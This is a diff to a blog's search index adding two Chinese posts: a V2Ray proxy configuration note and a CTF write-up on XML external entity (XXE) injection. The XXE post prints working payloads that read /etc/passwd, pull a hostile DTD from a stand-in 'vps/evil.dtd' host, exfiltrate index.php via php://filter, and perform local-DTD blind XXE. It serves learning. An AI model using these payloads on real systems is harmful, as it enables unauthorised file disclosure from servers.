@@ -1,6 +1,29 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[v2ray学习]]></title>
+    <url>%2F2019%2F08%2F15%2Fv2ray%E5%AD%A6%E4%B9%A0%2F</url>
+    <content type="text"><![CDATA[V2Ray 使用 inbound(传入) 和 outbound(传出) 的结构，这样的结构非常清晰地体现了数据包的流动方向，同时也使得 V2Ray 功能强大复杂的同时而不混乱，清晰明了。形象地说，我们可以把 V2Ray 当作一个盒子，这个盒子有入口和出口(即 inbound 和 outbound)，我们将数据包通过某个入口放进这个盒子里，然后这个盒子以某种机制（这个机制其实就是路由，后面会讲到）决定这个数据包从哪个出口吐出来。以这样的角度理解的话，V2Ray 做客户端，则 inbound 接收来自浏览器数据，由 outbound 发出去(通常是发到 V2Ray 服务器)；V2Ray 做服务器，则 inbound 接收来自 V2Ray 客户端的数据，由 outbound 发出去(通常是如 Google 等想要访问的目标网站)。 v2ray的工作原理： 客户端： 假设客户端配置inbounds，post为1080，协议是socks。首先需要在浏览器中设置代理sock host:127.0.0.1 port 1080 如果访问google.com 那么浏览器的数据包会发送到本机的1080端口，这个时候数据包被本机的v2ray客户端收到 再看outbounds。协议是vmess，v2ray客户端接收到数据包之后打包成vmess的格式并且用预设的id加密，然后发送到服务器地址xxxx，端口pppp 所以如下的配置大概就能理解了： 客户端： 1234567891011121314151617181920212223242526272829303132333435&#123; "inbounds": [ &#123; "port": 1080, // 监听端口 "protocol": "socks", // 入口协议为 SOCKS 5 "sniffing": &#123; "enabled": true, "destOverride": ["http", "tls"] &#125;, "settings": &#123; "auth": "noauth" //socks的认证设置，noauth 代表不认证，由于 socks 通常在客户端使用，所以这里不认证 &#125; &#125; ], "outbounds": [ &#123; "protocol": "vmess", // 出口协议 "settings": &#123; "vnext": [ &#123; "address": "serveraddr.com", // 服务器地址，请修改为你自己的服务器 IP 或域名 "port": 16823, // 服务器端口 "users": [ &#123; "id": "b831381d-6324-4d53-ad4f-8cda48b30811", // 用户 ID，必须与服务器端配置相同 "alterId": 64 // 此处的值也应当与服务器相同 &#125; ] &#125; ] &#125; &#125; ]&#125; 浏览器---&gt;本机的v2ray---&gt;vps监听的端口 服务端配置： 12345678910111213141516171819202122&#123; "inbounds": [ &#123; "port": 16823, // 服务器监听端口 "protocol": "vmess", // 主传入协议 "settings": &#123; "clients": [ &#123; "id": "b831381d-6324-4d53-ad4f-8cda48b30811", // 用户 ID，客户端与服务器必须相同 "alterId": 64 &#125; ] &#125; &#125; ], "outbounds": [ &#123; "protocol": "freedom", // 主传出协议 "settings": &#123;&#125; &#125; ]&#125; 在客户端配置的 inbounds 中，有一个 &quot;sniffing&quot; 字段，V2Ray 手册解释为“流量探测，根据指定的流量类型，重置所请求的目标”，这话不太好理解，简单说这东西就是从网络流量中识别出域名。这个 sniffing 有两个用处： 解决 DNS 污染； 对于 IP 流量可以应用后文提到的域名路由规则； 识别 BT 协议，根据自己的需要拦截或者直连 BT 流量 接着看服务器，服务器配置的 id 是 b831381d-6324-4d53-ad4f-8cda48b30811，所以 V2Ray 服务器接收到客户端发来的数据包时就会尝试用 b831381d-6324-4d53-ad4f-8cda48b30811 解密，如果解密成功再看一下时间对不对，对的话就把数据包发到 outbound 去，outbound.protocol 是 freedom（freedom 的中文意思是自由，在这里姑且将它理解成直连吧），数据包就直接发到 google.com 了。 参考 v2ray配置指南]]></content>
+      <categories>
+        <category>note</category>
+      </categories>
+      <tags>
+        <tag>v2ray</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[xxe学习]]></title>
+    <url>%2F2019%2F08%2F15%2Fxxe%E5%AD%A6%E4%B9%A0%2F</url>
+    <content type="text"><![CDATA[今天做题的时候遇到了一个xxe相关的题目，难度不大，现场学习的xxe，事后来总结一下： 原题的名字是who are you，进去之后有一个输入框，输入什么就会回显什么，首先试了一下xss，只出现了alert(1) 查看页面的源代码发现： 123456789101112131415161718192021222324function play() &#123; return false; &#125; function func() &#123; // document.getElementById().value var xml = '' + '&lt;\?xml version="1.0" encoding="UTF-8"\?&gt;' + '&lt;feedback&gt;' + '&lt;author&gt;' + document.getElementById('name').value+ '&lt;/author&gt;' + '&lt;/feedback&gt;'; console.log(xml); var xmlhttp = new XMLHttpRequest(); xmlhttp.onreadystatechange = function () &#123; if (xmlhttp.readyState == 4) &#123; // console.log(xmlhttp.readyState); // console.log(xmlhttp.responseText); var res = xmlhttp.responseText; document.getElementById('title').textContent = res &#125; &#125;; xmlhttp.open("POST", "index.php", true); xmlhttp.send(xml); return false; &#125;; 显然xml数据是拼接的，直接对&lt;script&gt;进行实体编码就能够xss，然而这题的考点并不是这个。 xml相关的自然是xxe，也就是XML 外部实体注入 这需要有一点DTD的知识： DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。 DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。 DTD的引入是为了规范XML的，从一个栗子可以看： DOCTYPE声明了XML由哪些标签，因为XML的标签不同于HTML，是可以自定义的。 DTD可以在XML文档内部声明，也可以外部引用,同时实体也可以内部声明或者外部引用 内部实体声明D 12345678DTD 实例:&lt;!ENTITY writer "Donald Duck."&gt;&lt;!ENTITY copyright "Copyright runoob.com"&gt;XML 实例：&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt; 外部实体声明 12345678DTD 实例:&lt;!ENTITY writer SYSTEM "http://www.runoob.com/entities.dtd"&gt;&lt;!ENTITY copyright SYSTEM "http://www.runoob.com/entities.dtd"&gt;XML example:&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt; 最常见的引入外部实体就是通过file协议读取文件： 12345&lt;?xml version="1.0" ?&gt;&lt;!DOCTYPE a [ &lt;!ENTITY b SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;c&gt;&amp;b;&lt;/c&gt; 另一种payload 123456&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE a[ &lt;!ENTITY % d SYSTEM "http://vps/evil.dtd"&gt; %d;]&gt;&lt;c&gt;&amp;b;&lt;/c&gt; 我们可以在自己的VPS上构造 1&lt;!ENTITY b SYSTEM "file:///etc/passwd"&gt; 也可以这样： 123&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE a SYSTEM "http://vps//evil.dtd"&gt;&lt;c&gt;&amp;b;&lt;/c&gt; vps上的evil.dtd内容： &lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt; 不同的程序支持的协议也有区别，比如今天遇到的题目就是支持php伪协议： ok到这里就差不多了。 献上拿到题目的payload： &lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=index.php&quot; &gt;]&gt; 其实就是通过php伪协议去读取文件，flag就在index.php里面 接下来看一道Google ctf2019的题目： 直奔主题好了，这个题目抓包发现传送的是json格式的数据，但是也可以修改为XML格式的数据，很神奇吧： 之后这个题目涉及到一个使用本地的dtd来盲注xxe的姿势： payload 12345678910&lt;!DOCTYPE message[ &lt;!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"&gt; &lt;!ENTITY % ISOamso ' &lt;!ENTITY &amp;#x25; file SYSTEM "file:///etc/passed"&gt; &lt;!ENTITY &amp;#x25; eval "&lt;!ENTITY &amp;#x26;&amp;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;"&gt; &amp;#x25;eval; &amp;#x25;error; '&gt; %local_dtd;]&gt; 参考 CTF学习--web--XXE 菜鸟教程 未知攻焉知防——XXE漏洞攻防]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>xxe</tag>
+        <tag>xml</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[php-storm环境]]></title>
     <url>%2F2019%2F08%2F14%2Fphp-storm%E7%8E%AF%E5%A2%83%2F</url>
     <content type="text"><![CDATA[继续配置了一波phpStorm的环境，感觉对这个IDE还有很多可以研究的地方 在这里可以修改php的路径，我选择了phpStudy的一个php解释器，因为其中安装了Xdebug。 配置apache的环境，选择的是Local or mounted folder,因为服务器就在本地 路由映射 之后就可以在phpStorm写完代码部署到本地的服务器上了 也可以debug了]]></content>
@@ -121,8 +144,8 @@
         <category>ctf</category>
       </categories>
       <tags>
-        <tag>De1ctf</tag>
         <tag>hash</tag>
+        <tag>De1ctf</tag>
       </tags>
   </entry>
   <entry>
